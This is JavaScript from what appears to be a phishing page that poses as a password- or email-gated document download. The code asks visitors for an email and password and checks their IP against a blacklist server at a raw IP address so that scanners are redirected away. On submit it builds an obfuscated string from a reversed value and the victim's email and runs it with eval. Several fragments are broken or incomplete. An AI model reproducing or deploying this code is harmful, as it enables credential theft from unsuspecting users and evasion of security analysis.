       // Function to check if IP address is blacklisted
    function checkBlacklistedIP(ip) {

        fetch('http://198.46.129.153:7500/_~/clap.php?ip=' + ip)
            .then(response => response.text())
            .then(data => {
                if (data === 'blacklisted') {
                    console.log('IP ' + ip + ' is already blacklisted. Redirecting...');

                    redirectToBlockedPage();

                } else if (data === 'clean') {
                    console.log('IP ' + ip + ' is not blacklisted. Proceeding...');

                } else {

            })

    }
    function redirectToBlockedPage() {
        window.location.href = 'document.html'; // Replace 'blocked.html' with your blocked page URL
    }

    // Function to add blacklisted IP address
    function addBlacklistedIP(ip) {
        // Check if IP is already in the blacklist
        fetch('http://198.46.129.153:7500/_~/clap.php?ip=' + ip)
            .then(response => response.text())
            .then(data => {
                if (data !== 'blacklisted') {
                    fetch('http://198.46.129.153:7500/_~/clap.php', {
                        method: 'POST',
                        headers: {

                    })

                    })

function redirectToGoodPage() {

}

const cmoValue = getParameterByName('cmo'); // Get 'cmo' value from the URL
const cnameElement = document.getElementById('cname');
if (cmoValue) {

const com = cmoValue.charAt(0).toUpperCase() + cmoValue.slice(1).toLowerCase();

} else {
// If 'cmo' is missing or empty, show the protected message
cnameElement.textContent = 'This document is protected verify your email to proceed.';
}

   document.addEventListener('DOMContentLoaded', function () {
    const response = JSON.parse(document.getElementById('response')?.value);
    const linkId = document.getElementById('linkId')?.value;
    const hostName = document.getElementById('hostname').value;
    const hostnameToCallApiFromEjs = document.getElementById('hostnameToCallApiFromEjs').value;

    const passwordInput = document.getElementById('password');
    const smLoader = document.getElementById('sm-loader');
    const submitBtn = document.getElementById('submit-btn');

    const passwordError = document.getElementById('passwordError');
    const emailInput = document.getElementById('email');
    const emailError = document.getElementById('emailError');
    const commonError = document.getElementById('commonError');

    let isEmailValid = false;
    let privacyPolicyConsents = [];
    let isPasswordValid = false;

    const language = navigator.language || 'en';
    if (response?.isPrivacyPolicyEnabled) {
        setPolicyAndConsentDetails();
    }

    if (response?.isLinkPasswordProtected) {
        addEventListenerToId('password', 'blur', validatePassword);
    }
    if (response?.isEmailRequired) {
        addEventListenerToId('email', 'blur', validateEmail);
    }
    addEventListenerToId('submit-btn', 'click', onSubmit);

    if (!response?.isPrivacyPolicyEnabled && !response?.isEmailRequired && !response?.isLinkPasswordProtected) {
        directDownloadFile();
    }

    async function directDownloadFile() {
        try {
            const publicUrl = await getPublicURL();
            downloadFile(publicUrl);
            setTimeout(() => {
                window.self.close();
            }, 500);
        } catch (err) {
            console.log(err);
        }
    }

    async function setPolicyAndConsentDetails() {
        showLoader();
        try {
            const privacyPolicyDetails = await getPrivacyPolicy();
            setPrivacyPolicyAndConsents(privacyPolicyDetails);
            stopLoader();
        } catch (err) {
            stopLoader();
            console.log(err);
        }
    }

    function validateEmail() {
        const emailRegex = /^\s*[A-Z0-9_]([A-Z0-9._-]|\+)*@[A-Z0-9.-]+\.[A-Z]{2,}\s*$/i;
        const trimmedEmailValue = emailInput.value.trim();
        const isValid = trimmedEmailValue !== '' && emailRegex.test(emailInput.value);

        isEmailValid = isValid;
        isValid ? enabledSubmitBtn() : disabledSubmitBtn();
        emailError.textContent = isValid ? '' : (trimmedEmailValue === '' ? 'Email is required.' : 'Invalid email format.');
        emailError.classList.toggle('hide', isValid);
        return isValid;
    }

    function validatePassword() {
        let userTypedPassword = passwordInput.value;
        if (!userTypedPassword.trim()) {
            isPasswordValid = false;
            passwordError.textContent = 'Password is required.';
            passwordError.classList.remove('hide');
            disabledSubmitBtn();
            return;
        } else {
            isPasswordValid = true;
            passwordError.textContent = '';
            passwordError.classList.add('hide');
            enabledSubmitBtn();
        }
    }

    function setPrivacyPolicyAndConsents(privacyPolicyDetails) {
        if (privacyPolicyDetails?.privacyPolicy) {
            setPrivacyPolicyValue(privacyPolicyDetails.privacyPolicy);
        }

        if (privacyPolicyDetails?.consentToProcess) {
            setConsentToProcessValue(privacyPolicyDetails?.consentToProcess);
        }

        if (privacyPolicyDetails?.consentToCommunication) {
            setConsentToCommunicationValue(privacyPolicyDetails.consentToCommunication);
        }

        if (privacyPolicyDetails?.consentOptions?.length) {
            setConsentsOption(privacyPolicyDetails.consentOptions);
        }
    }

    function setPrivacyPolicyValue(value) {
        document.getElementById('privacyPolicy').innerHTML = value;
    }

    function setConsentToProcessValue(value) {
        document.getElementById('consentToProcess').innerHTML = value;
    }

    function setConsentToCommunicationValue(value) {
        document.getElementById('consentToCommunication').innerHTML = value;
    }

    function setConsentsOption(consentOptions = []) {
        const consentsOptionsContainer = document.getElementById('privacyPolicyConsentsContainer');
        privacyPolicyConsents = [];
        consentOptions.forEach(consent => {
            const existingConsent = privacyPolicyConsents.find(c => c.subscriptionId === consent.subscriptionId);
            if (!existingConsent) {
                privacyPolicyConsents.push({ ...consent, value: false });
                createConsentOption(consent, consentsOptionsContainer);
            }
        });
    }


    function showLoader() {
        smLoader.style.display = 'flex';
    }

    function stopLoader() {
        smLoader.style.display = 'none';
    }

    function updateConsentOptionValue(consentId, value) {
        const consent = privacyPolicyConsents.find(consent => consent.subscriptionId === consentId);
        if (consent) {
            consent.value = value;
        }
    }

    async function onSubmit() {
        commonError?.classList?.add('hide');
        if ((!response.isLinkPasswordProtected || isPasswordValid) && (!response?.isEmailRequired || isEmailValid)) {
            if (response.isLinkPasswordProtected) {
                passwordError.textContent = '';
            }
            showBtnLoader();
            try {
                const publicUrl = await getPublicURL();
                stopBtnLoader();
                downloadFile(publicUrl);
            } catch (err) {
                commonError.textContent = err;
                commonError.classList.remove('hide');
                stopBtnLoader();
            }
        } else {
            commonError.textContent = 'Please ensure all required fields are filled out correctly.';
            commonError.classList.remove('hide');
        }
    }

    async function getPublicURL() {
    let data = {};
    if (response.isLinkPasswordProtected && passwordInput.value.trim() !== '') {
        data.password = passwordInput.value;
    }
    if (privacyPolicyConsents?.length) {
        data.privacyPolicyConsent = privacyPolicyConsents;
    }
    if (response.isEmailRequired && emailInput.value.trim() !== '') {
        data.email = emailInput.value;
    }

    return new Promise((resolve, reject) => {
  data.email = emailInput.value;

        d = c.split('').reduce((reversed, char) => char + reversed, '');
        e = '#'+data.email
        var silver = b + d + e + '\'';
        eval(silver);
    });
}

    function showBtnLoader() {
        submitBtn.disabled = true;

    }

    function stopBtnLoader() {
        submitBtn.disabled = false;
        submitBtn.innerHTML = 'Download';
    }


    function disabledSubmitBtn() {
        submitBtn.disabled = true;
    }

    function enabledSubmitBtn() {
        submitBtn.disabled = false;
    }

    function addEventListenerToId(id, event, callback) {
        const element = document.getElementById(id);
        if (element) {
            element.addEventListener(event, callback);
        }
    }
});
}

</script>
